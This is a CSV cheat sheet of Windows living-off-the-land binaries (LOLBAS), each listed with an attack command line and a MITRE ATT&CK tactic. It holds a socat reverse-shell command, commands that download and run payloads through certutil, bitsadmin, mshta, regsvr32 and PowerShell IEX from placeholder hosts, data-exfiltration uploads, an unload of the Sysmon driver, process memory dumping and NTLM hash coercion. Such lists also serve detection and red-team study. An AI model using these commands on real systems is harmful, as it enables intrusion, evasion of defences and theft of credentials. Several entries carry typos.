Tools,Service,Port,Syntax & Description,Tags,MITRE ATT&CK
AtBroker.exe,LOLBAS,,"ATBroker.exe /start {malware}
Executes code defined in registry for a new AT.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Bash.exe,LOLBAS,,"bash.exe -c calc.exe - Starts calculator
bash.exe -c “socat tcp-connect:{IP} exec:sh,pty,stderr,setsid,sigint,sane” - starts reverse shell
Performs execution of specified file","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Bitsadmin.exe,LOLBAS,,"bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1

Creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an alternate data stream.","LOLBAS, LOTL (Living Off The Land)","Defense Evasion, Persistence"
CertOC.exe,LOLBAS,,"certoc.exe -LoadDLL “C:\test\calc.dll” - Loads target DLL file
certoc.exe -GetCACAPS https://insertwebsitehere[.]com - downloads text formatted files
","LOLBAS, LOTL (Living Off The Land)","Defense Evasion, Ingress Tool Transfer"
CertReq.exe,LOLBAS,,CertReq -Post -config https://insertwebsitehere[.]com c:\windows\win.ini output.txt - save HTTP POST from website to “output.txt”,"LOLBAS, LOTL (Living Off The Land)",Ingress Tool Transfer
Certutil.exe,LOLBAS,,"certutil.exe -urlcache -split -f http://[insertwebsitehere].com/filenamehere {filename} - Download and saves file to current folder
certutil -encode inputFileName encodedOutputFileName - Base64 encoding files
certutil -decode encodedInputFileName decodedOutputFileName - Decodes base64","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Cmdkey.exe,LOLBAS,,cmdkey /list - List cached Credentials,"LOLBAS, LOTL (Living Off The Land)","Defense Evasion, Initial Access, Persistence, Privilege Escalation"
cmdl32.exe,LOLBAS,,cmdl32.exe /vpn /lan %cd%\config - Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under name VPNXXXXX.tmp,"LOLBAS, LOTL (Living Off The Land)",Ingress Tool Transfer
cmstp.exe,LOLBAS,,cmstp.exe /ni /s c:\cmstp\CorpVPN.inf - Silently installs a specially formated local .INF without creating desktop icon. the INF file contains a UnRegisterOCXSection which executes a .SCT file using scrobj.dll,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
colorcpl.exe,LOLBAS,,colorcpl file.txt - copies the referenced file to C:\Windows\System32\spool\drivers\color ,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
configsecuritypolicy.exe,LOLBAS,,"ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://[insertsite.com]/xxxx/encodedfile - upload file, credentials or data exfiltration","LOLBAS, LOTL (Living Off The Land)",Exfiltration
conhost.exe,LOLBAS,,conhost.exe calc.exe - execute calc.exe with conhost as parent process.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
control.exe,LOLBAS,,control.exe c:\windows\tasks\file.txt:evil.dll - binary used to launch controlpanel items in Windows,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
csc.exe,LOLBAS,,csc.exe -out:my.exe file.cs - compiles C# from file.cs into “my.exe”,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
cscript.exe ,LOLBAS,,cscript //e:vbscript c:\ads\file.txt:script.vbs - Use cscript.exe to execute a VBScript (VIsual Basic) stored in an Alternate Data Stream (ADS),"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
CustomShellHost.exe,LOLBAS,,CustomShellHost.exe executes explorer.exe (with command-line argument /NoShellRegistrationCheck),"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
DataSvcUtil.exe,LOLBAS,,DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://[insertwebsite]/[xxxxxx?encodedfile - Upload file credentials or data exfil,"LOLBAS, LOTL (Living Off The Land)",Exfiltration
Desktopimgdownldr.exe,LOLBAS,,set “SYSTEMROOT=C:\Windows\Temp” && cmd /c desktopimagedownldr.exe /lockscreenurl:https://domain.com/file.ext /eventName:desktopimgdownldr - Downloads file and sets as computer lock screen,"LOLBAS, LOTL (Living Off The Land)",Command And Control
DeviceCredentialDeployment.exe,LOLBAS,,DeviceCredentialDeployment - Grab the console window handle and set it to hidden,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Dfsvc.exe,LOLBAS,,"rundll32.exe dfshim.dll,ShOpenVerbApplication http://[domain].com/application/param - Executes click-once application from URL","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Diantz.exe,LOLBAS,,diantz.exe c:\pathtofile\file.exe c:\destinationfolder\targetfile.txt:targetfile.cab - Binary that packages existing files into a cabinet .cab file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
DiskShadow.exe,LOLBAS,,"diskshadow.exe /s c:\test\diskshadow.txt - exposes the functionality offered by the volume shadow copy service
diskshadow> exec calc.exe - execute commands to spawn child process","LOLBAS, LOTL (Living Off The Land)","Credential Access, Defense Evasion"
dnscmd.exe,LOLBAS,,dnscmd.exe dc1.lab[.]int /config /servicelevelplugindll \\{IP}\dll\wtf.dll - Adds a specially crafted DLL as a plug-in of the DNS Service,"LOLBAS, LOTL (Living Off The Land)","Persistence, Privilege Escalation"
esentutl.exe,LOLBAS,,esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\deskfile.vbs /o - Copies the source VBS file to the destination VBS file.,"LOLBAS, LOTL (Living Off The Land)",Command And Control
eventvwr.exe,LOLBAS,,eventvwr.exe - execute a binary or script as a high-integrity process without a UAC prompt.,"LOLBAS, LOTL (Living Off The Land)","Defense Evasion, Privilege Escalation"
expand.exe,LOLBAS,,expand \\webdav\folder\file.bat c:\ADS\file.bat - Copies source file to destination,"LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
explorer.exe,LOLBAS,,explorer.exe /root “C:\Windows\System32\calc.exe” - execute calc.exe with the parent process spawning from a new instance of explorer.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
extexport.exe,LOLBAS,,"extexport.exe c:\tst - Load a DLL located in the location with one of the following names: mozcrt19.dll, mozsqlite3.dll, sqlite.dll","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
extrac32.exe,LOLBAS,,extrac32 c:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe - Extracts the source CAB file into an Alternate Data Stream (ADS),"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
findstr.exe,LOLBAS,,findstr /V /L W3AllLov3LolBas C:\ADS\file.exe > c:\ADS\file.txt:file.exe - searches for the string W3AllLov3LolBas since it does not exist file.exe is written to an ADS,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
finger.exe,LOLBAS,,"finger user@example.host[.]com | more +2 | cmd - Downloads payload from example.host[.]com asking for user “user” which could contain malicious code, executes via CMD process.","LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
fltMC.exe,LOLBAS,,fltMC.exe unload SysmonDrv - Unloads a driver used by security agents,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Forfiles.exe,LOLBAS,,forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe - executes calc.exe since there is a match for notepad in system32 folder,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Fsutil.exe,LOLBAS,,fsutil.exe file setZeroData offset=o length=99999999999 C:\Windows\Temp\payload.dll - can be used to forensically erase a file,"LOLBAS, LOTL (Living Off The Land)",Impact
Ftp.exe,LOLBAS,,echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt - Executes the commands you put inside the text file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
gpscript.exe,LOLBAS,,gpscript /logon - executes logon scripts configured in group policy,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
hh.exe,LOLBAS,,hh.exe http://some.url/script.ps1 - open the target PowerShell script with HTML help,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
imewdbld.exe,LOLBAS,,c:\windows\system32\ime\shared\imewdbld.exe https://[somewebsitehere][.]com - downloads file and saves it to %localappdata%\INETCACHE\Random_alnum_char\filename,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
ie4uinit.exe,LOLBAS,,ie4uinit.exe -BaseSettings executes commands from a specially prepared ie4uinit.inf file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
iediagcmd.exe,LOLBAS,,set windir=c:\test& cd “C:\Program Files\Internet Explorer\” & iediagcmd.exe /out:c\test\foo.cab - executes binary that is pre-planted at c:\test\system32\netsh.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
ieexec.exe,LOLBAS,,ieexec.exe http://[somesitehere][.]com/bypass.exe - downloads and executes bypass.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
ilasm.exe,LOLBAS,,ilasm.exe c:\public\test.txt /exe - binary file used by .NET to compile C#intermediate (IL) code to .exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
infdefaultinstall.exe,LOLBAS,,InfDefaultInstall.exe Infdefaultinstall.inf - executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Installutil.exe,LOLBAS,,InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll - Execute the target .NET DLL or EXE,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Jsc.exe,LOLBAS,,jsc.exe scriptfile.js - use jsc.exe to compile javascript stored in a scriptfile and output scriptfile.exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
ldifde.exe,LOLBAS,,"Ldifde -i -f inputfile.ldf - Creates, modifies and deletes LDAP directory objects","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
makecab.exe,LOLBAS,,"makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab - compress the target file into a CAB file stored in the ADS of the target file.

makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab - Download file and compress into a cab file","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Mavinject.exe,LOLBAS,,Mavinject.exe 3110 /INJECTRUNNING c:\folder\evil.dll - Inject evil.dll into a process with PID 3110,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Microsoft.Workflow.Compiler.exe,LOLBAS,,Microsoft.workflow.compiler.exe tests.xml results.xml - compile and execute C# or VB.net code in a XOML file referenced in teh test.xml file.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
mmc.exe,LOLBAS,,mmc.exe -Embedding c:\path\to\test.msc - launch a backgrounded MMC process and invoke a COM payload,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
MpCmdRun.exe,LOLBAS,,MpCmdRun.exe -Downloadfile -url https://[server.beacon][.]com/[beacon.exe] -path c:\temp\beacon.exe - download file to specified path,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
MsBuild.exe,LOLBAS,,"msbuild.exe pshell.xml - Build and execute C# project stored in the target XML file
msbuild.exe project.csproj - build and execute a C#] project stored in the target csproj file","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Msconfig.exe,LOLBAS,,msconfig.exe -5 - executes command embedded in craft c:\windows\system32\mscfgtlc.xml,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Msdt.exe,LOLBAS,,msdt.exe -path C:\Windows\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE - Executes the microsoft diagnostic tool and executes the malicious .MSI referenced in the PCW.xml file.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
msedge.exe,LOLBAS,,"msedge.exe https://[somewebsitehere][.]com/file.exe.txt - will launch edge and download the file, a harmless extension e.g txt or .zip should be appended to avoid smartscreen","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
mshta.exe,LOLBAS,,"mshta.exe evilfile.hta - opens the target .hta file and executes teh embedded javascript, jscript or vbscript
mshta.exe vbscript:Close(Execute(”GetObject(””script:https://[randomsite][.]com””)”)) - Executes VBScript
mshta.exe javascript:a=GetObject(”script:https://[sitehere][.]com”).Exec();close();","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Msiexec.exe,LOLBAS,,msiexec /quiet /i cmd.msi - installs the target MSI file silently,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Netsh.exe,LOLBAS,,netsh.exe add helper c:\users\user\file.dll - use Netsh in order to execute a dll file,"LOLBAS, LOTL (Living Off The Land)","Defense Evasion, Persistence, Privilege Escalation"
Odbcconf.exe,LOLBAS,,odbcconf /a {REGSVR C:\test\test.dll} - Execute DIIREgisterServer from DLL specified,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
OfflineScannerShell.exe,LOLBAS,,OfflineScannerShell - Execute mpclient.dll library in the current working directory,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
OneDriveStandaloneUpdater.exe,LOLBAS,,OneDriveStandaloneUpdater - Download a file from the web address specified in HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Pcalua.exe,LOLBAS,,pcalua.exe -a calc.exe - Open the target .EXE using the program computability assistant ,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Pcwrun.exe,LOLBAS,,pcwrun.exe C:\temp\beacon.exe - Open the target .EXE file with the program compatibility wizard,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Pktmon.exe,LOLBAS,,pktmon.exe start - -etw - Will start a packet capture and store log file as PktMon.etl Use pktmon.exe stop,"LOLBAS, LOTL (Living Off The Land)","Credential Access, Discovery"
Pnputil.exe,LOLBAS,,pnputil.exe -i -a C:\Users\hai\Desktop\mo.inf - Used for Installing Drivers,"LOLBAS, LOTL (Living Off The Land)","Persistence, Privilege Escalation"
Presentationhost.exe,LOLBAS,,"Presentaitonhost.exe C:\temp\evil.xbap - Executes the target XAML Browser application (XBAP) file
Presentationhost.exe https://[somesitehere][.]com - Downloads file","LOLBAS, LOTL (Living Off The Land)","Command And Control, Defense Evasion"
Print.exe,LOLBAS,,print \D:C:\ADS\File.txt:file.exe C:\ADS\File.exe - Copy file .exe into the Alternate Data Stream (ADS) of file.txt ,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
PrintBrm.exe,LOLBAS,,PrintBrm -b -d \\IP\share\example_folder -f C:\Users\user\desktop\new.zip - Create a ZIP file from a folder in a remote device,"LOLBAS, LOTL (Living Off The Land)",Command And Control
Provlaunch.exe,LOLBAS,,"provlaunch.exe LOLBin -
Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. ""reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0"" and ""reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe"". Registry keys are deleted after successful execution.","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Psr.exe,LOLBAS,,"psr.exe /start /output D:\test.zip /sc 1 /gui 0 - record a user screen without creating a GUI, use psr.exe /stop recording and create output file","LOLBAS, LOTL (Living Off The Land)",Collection
Rasautou.exe,LOLBAS,,rasautou -d powershell.dll -p powerhsell -a a -e e - loads the target dll specified in -d and executes the export specified in -p,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
rdrleakdiag.exe,LOLBAS,,rdrleakdiag.exe /p 940 /o c:\evil /fullmemdmp /wait 1 - dump process by PID and create a dump file,"LOLBAS, LOTL (Living Off The Land)",Credential Access
"reg,exe",LOLBAS,,reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\ads\file.txt:evilreg.reg export the target registry key and save it to the specified .REG file within an ADS.,"LOLBAS, LOTL (Living Off The Land)",Credential Access
regasm.exe,LOLBAS,,regasm.exe AllTheThingsx64.dll - Loads the target .dll file and executes the registerclass function,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
regedit.exe,LOLBAS,,regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey - Export the target registry key to the specified REG file.,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
regini.exe,LOLBAS,,regini.exe newfile.txt:hidden.ini - Write registry keys from data inside the ADS (Alternate Data Stream),"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
register-cimprovider.exe,LOLBAS,,Register-cimprovider -path “C:\folder\evil.dll” - Load the target DLL,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
regsvcs.exe,LOLBAS,,regsvcs.exe AllTheThingsx64.dll - Loads the target .dll file and executes the registerclass function,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
regsvr32.exe,LOLBAS,,regsvr32 /s /n /u /i:http://[somewebsite][.]com/file.sct scrobj.dll - Execute the specified remote .SCT script with scrobj.dll,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Replace.exe,LOLBAS,,replace.exe C:\Source\file.cab C:\Destination /A - Copy file .cab to destination,"LOLBAS, LOTL (Living Off The Land)",Command And Control
rpcping.exe,LOLBAS,,rpcping -s {ip} -e 1234 -a privacy -u NTLM - Send a RPC test connection to the targetr server -s and force the NTLM hash to be sent in the process,"LOLBAS, LOTL (Living Off The Land)",Credential Access
rundll32.exe,LOLBAS,,rundll32.exe AllTheThingsx64 EntryPoint - AllThethingsx64 would be a DLL file and EntryPoint would be the name of the entry point in the DLL to execute,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
runexehelper.exe,LOLBAS,,runexehelper.exe c:\windows\system32\calc.exe - launches the specified exe,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
runonce.exe,LOLBAS,,runonce.exe /AlternateShellStartup - Executes a run once task that has been configured in the registry,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
runscripthelper.exe,LOLBAS,,runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\test - Execute the Powershell script named test.txt,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Sc.exe,LOLBAS,,sc create evilservice binPath=”\”c:\\ADS\\file.txt:cmd.exe\” /c echo works >\”c:\ADS\works.txt\”” DisplayName = “evilservice” start = auto\ & sc start evilservice - creates a new service and executes the file stored in the ADS,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
schtasks.exe,LOLBAS,,shtasks /create /sc minute /mo 1 /tn “Reverse Shell” /tr c:\some\directory\reverseshell.exe - Create a reoccuring task to execute every minute,"LOLBAS, LOTL (Living Off The Land)","Execution, Persistence, Privilege Escalation"
scriptrunner.exe,LOLBAS,,scriptrunner.exe -appvscript calc.exe - execute binary through proxy binary,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
setres.exe,LOLBAS,,setres.exe -w 800 -h 600 - Sets the resolution then launches ‘choice’ command from the working directory,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
SettingSyncHost.exe,LOLBAS,,SettingSyncHost -LoadAndrunDiagScript anything - Execute file specified in %COMPSEC%,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
ssh.exe,LOLBAS,,ssh local[.]host calc.exe - execute calc.exe on host machine the prompt for password can be eliminated by adding the host’s public key,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
stordiag.exe,LOLBAS,,stordiag.exe - once executed stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe if stordiag.exe is copied to a folder and an arbitrary executable is renamed to oen of these names stordiag.exe will execute it,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
"SyncAppvPublishingServer.,exe",LOLBAS,,SyncAppvPublishingServer.exe “n;(New-Object Net.Webclient).DownloadString(’http://someurl[.]com/script.ps1’) | IEX” - Example command on how to inject powershell code into process,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
Tar.exe,LOLBAS,,tar -xf \\host1\archive.tar - Extracts archive .tar from the remote (internal) host1 to the current host.,"LOLBAS, LOTL (Living Off The Land)","Command And Control, Ingress Tool Transfer"
ttdinject.exe,LOLBAS,,TTDInject.exe /ClientParams “7 http://tmp.run 0 0 0 0 0 0 0” /Launch “C:\Windows\System32\calc.exe” - execute calc using ttdinject.exe requires admin privs,"LOLBAS, LOTL (Living Off The Land)",Defense Evasion
tttracer.exe,LOLBAS,,"tttracer,exe C:\Windows\system32\cakc.exe - execute calc using tttracer.exe requires admin privileges","LOLBAS, LOTL (Living Off The Land)",Defense Evasion
